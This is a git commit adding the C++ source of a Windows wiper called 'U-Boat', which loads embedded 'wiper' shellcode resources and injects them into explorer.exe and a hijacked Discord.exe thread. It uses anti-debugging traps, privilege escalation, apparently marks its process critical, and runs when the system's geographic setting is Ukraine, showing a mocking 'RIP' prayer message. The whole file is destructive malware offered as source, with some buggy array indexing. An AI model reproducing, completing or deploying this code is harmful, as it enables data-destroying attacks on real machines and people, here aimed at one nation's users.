bab7dced801de52f67351898aeb7fc033e6175f8
ZeroM3m0ry <anashadane1@gmail.com>
2022-03-14 18:43:45 +0100

    Add project files.

---
+++ U-Boat/U-Boat.cpp
@@ -0,0 +1,314 @@
+#include <iostream>
+#include <Windows.h>
+#include <TlHelp32.h>
+#include <iomanip>
+#include <Shlwapi.h>
+#include <thread>
+#include <stdio.h>
+#include "resource.h"
+#pragma comment( lib, "shlwapi.lib")
+
+DWORD wf8kmain(unsigned int ags);
+
+void L1BEL2()
+{
+    __try
+    {
+        __asm int 3;
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        wf8kmain(0);
+    }
+}
+
+void LABEL93()
+{
+    __try
+    {
+        __asm int 3;
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        L1BEL2();
+    }
+}
+
+_declspec(naked) void GoodBye()
+{
+    __asm
+    {
+        push ebp
+        mov ebp, esp
+        push 0
+        push priest
+        push rip
+        push MB_OK
+        call MessageBoxA
+        pop ebp
+        ret
+    }
+}
+
+DWORD GetPID(const char* pn)
+{
+    DWORD procId = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (hSnap != INVALID_HANDLE_VALUE)
+    {
+        PROCESSENTRY32 pE;
+        pE.dwSize = sizeof(pE);
+
+        if (Process32First(hSnap, &pE))
+        {
+            if (!pE.th32ProcessID)
+                Process32Next(hSnap, &pE);
+            do
+            {
+                if (!_stricmp(pE.szExeFile, pn))
+                {
+                    procId = pE.th32ProcessID;
+                    break;
+                }
+            } while (Process32Next(hSnap, &pE));
+        }
+    }
+    CloseHandle(hSnap);
+    return procId;
+}
+
+
+DWORD EnThread(DWORD procID)
+{
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    DWORD ThID;
+    if (procID == 0x0)
+        EXIT_FAILURE;
+    if (hSnap != INVALID_HANDLE_VALUE)
+    {
+        THREADENTRY32 pE;
+        pE.dwSize = sizeof(pE);
+
+        if (Thread32First(hSnap, &pE))
+        {
+            do
+            {
+                if (procID == pE.th32OwnerProcessID)
+                {
+                    ThID = pE.th32ThreadID;
+                    break;
+                }
+            } while (Thread32Next(hSnap, &pE));
+        }
+    }
+    CloseHandle(hSnap);
+    return(ThID);
+}
+
+
+BOOL ShInJ(int op)
+{
+
+    HANDLE status = NULL, proc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPID("explorer.exe"));
+    if (!proc || !ExecBuffer[op])
+        return 0;
+    void* base = VirtualAllocEx(proc, NULL, Size[op], MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!base)
+    {
+        CloseHandle(proc);
+        return 0;
+    }
+    if (!WriteProcessMemory(proc, base, ExecBuffer[op], Size[op], 0))
+    {
+        CloseHandle(proc);
+        return 0;
+    }
+    DWORD tmp = 0;
+    if (!CreateRemoteThread(proc, NULL, Size[op], (LPTHREAD_START_ROUTINE)base, NULL, NULL, &tmp));
+    return 0;
+    CloseHandle(proc);
+    return 1;
+}
+
+BOOL Bs8d(void) {
+    HMODULE ntdll = LoadLibrary("ntdll.dll");
+    if (!ntdll)
+        return -1;
+    PtrAdjPrv RtlAdjustPrivilege = (PtrAdjPrv)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+    if (!RtlAdjustPrivilege)
+        return 1;
+
+    PtrSInfoProc NtSetInformationProcess = (PtrSInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
+    if (!NtSetInformationProcess)
+        return 1;
+    PVOID tmp = 0;
+    BOOLEAN tmp2 = 0;
+    RtlAdjustPrivilege(19, TRUE, FALSE, &tmp2);
+    NtSetInformationProcess(GetCurrentProcess(), 0x1d, &tmp, sizeof(ULONG));
+    FreeLibrary(ntdll);
+
+}
+
+BOOL H8jk(int op)
+{
+    DWORD pr = 0;
+    CONTEXT context;
+    context.ContextFlags = CONTEXT_FULL;
+    HANDLE htd, proc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPID("Discord.exe"));
+    if (!proc || !ExecBuffer[op])
+        return 0;
+    void* base = VirtualAllocEx(proc, NULL, Size[op], MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!base)
+    {
+        CloseHandle(proc);
+        return 0;
+    }
+    if (!WriteProcessMemory(proc, base, ExecBuffer[op], Size[op], 0))
+    {
+        CloseHandle(proc);
+        return 0;
+    }
+    htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr));
+    if (!htd)
+    {
+        CloseHandle(proc);
+        return 0;
+    }
+    if (SuspendThread(htd) == (DWORD)-1)
+    {
+        CloseHandle(proc);
+        CloseHandle(htd);
+        return 0;
+    }
+    if (!GetThreadContext(htd, &context))
+    {
+        CloseHandle(proc);
+        CloseHandle(htd);
+        return 0;
+    }
+    context.Eip = (DWORD)base;
+    if (!SetThreadContext(htd, &context))
+    {
+        CloseHandle(proc);
+        CloseHandle(htd);
+        return 0;
+    }
+
+    if (ResumeThread(htd) == (DWORD)-0b01)
+    {
+        CloseHandle(proc);
+        CloseHandle(htd);
+        return 0;
+    }
+    __asm
+    {
+        push proc
+        call CloseHandle
+        push htd
+        call CloseHandle
+    }
+    return 1;
+}
+
+HGLOBAL LoadExbff(int i, LPCSTR lpName)
+{
+    HRSRC shellcodeRe = FindResource(NULL, MAKEINTRESOURCE(IDR_WPR01 + i), lpName);
+    if (!shellcodeRe)
+        return NULL;
+
+    Size[i] = SizeofResource(NULL, shellcodeRe);
+    HGLOBAL ExBuffer = LoadResource(NULL, shellcodeRe);
+    if (!ExBuffer)
+        return NULL;
+    return ExBuffer;
+}
+
+void KamiKaze(DWORD size)
+{
+    void* buff = VirtualAlloc(0, (SIZE_T)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    CreateRemoteThread(GetCurrentProcess(), NULL, size, (LPTHREAD_START_ROUTINE)buff, NULL, NULL, NULL);
+    return;
+
+}
+
+DWORD wf8kmain(unsigned int ags)
+{
+
+    int i = -1;
+    while (++i < 3)
+    {
+        ExecBuffer[i] = LoadExbff(i, lpnArr[i]);
+        if (ShInJ(i))
+            ScA += 1;
+        if (i == 2)
+        {
+            while (i < 5)
+            {
+                ExecBuffer[i] = LoadExbff(i, lpnArr[i]);
+                if (H8jk(i++))
+                    ScA += 1;
+            }
+            return 2;
+        }
+    }
+    if (ags == 1)
+    {
+        __asm
+        {
+            push 400
+            call Sleep
+        }
+        wf8kmain(0);
+    }
+    if (!ScA)
+    {
+        i = 0;
+        while (i < 5)
+        {
+            if (Size[i])
+                KamiKaze(Size[i]);
+            i++;
+        }
+    }
+
+    return 0;
+}
+
+int wmain()
+{
+
+    if (GetUserGeoID(GEOCLASS_NATION) == UKR)
+    {
+        __try
+        {
+            __asm int 3;
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {}
+        {
+            Bs8d();
+            LABEL93();
+        }
+        __asm {
+            push 0xcb
+            call SetUserGeoID
+        }
+    }
+    if (ScA)
+    {
+        Sleep(240000);
+        __asm
+        {
+            mov eax, UKR
+            sub eax, UKR
+            push eax
+            call exit
+        }
+    }
+    __asm
+    {
+        xor eax, eax
+        push eax
+        call exit
+    }
+}
---
+++ U-Boat/resource.h
@@ -0,0 +1,41 @@
+//{{NO_DEPENDENCIES}}
+// Microsoft Visual C++ generated include file.
+// Used by U-Boat.rc
+//
+#define IDR_WPR01                       101
+#define IDR_WPR11                       102
+#define IDR_WPR21                       103
+#define IDR_WPR31                       104
+#define IDR_WPR41                       105
+
+DWORD Size[3];
+const LPCSTR lpnArr[3] = { "wiper1","wiper2","wiper3" };
+HGLOBAL ExecBuffer[3];
+static unsigned int ScA;
+const char* const rip = "RIP";
+const char* const priest = "Receive the Lord's blessing. The Lord bless you and watch over you.\
+							The Lord make his face shine upon you, and be gracious to you. The Lord \
+						look kindly on you and give you peace; In the Name of the Father, and of the \
+								Son + and of the Holy Spirit.\"Congregation: \" Amen.";
+
+typedef LONG NTSTATUS;
+typedef NTSTATUS(NTAPI* PtrAdjPrv)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+typedef NTSTATUS(NTAPI* PtrSInfoProc)(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
+#define UKR								241
+#define ALB								0x6
+#define BEL								0x15
+#define	BGR								0x23
+#define CAN								0x27
+#define HRV								0x6c
+#define CZE								0x4b
+#define FRA								0x54
+#define UK								0xf2
+
+#ifdef APSTUDIO_INVOKED
+#ifndef APSTUDIO_READONLY_SYMBOLS
+#define _APS_NEXT_RESOURCE_VALUE        106
+#define _APS_NEXT_COMMAND_VALUE         40001
+#define _APS_NEXT_CONTROL_VALUE         1001
+#define _APS_NEXT_SYMED_VALUE           101
+#endif
+#endif
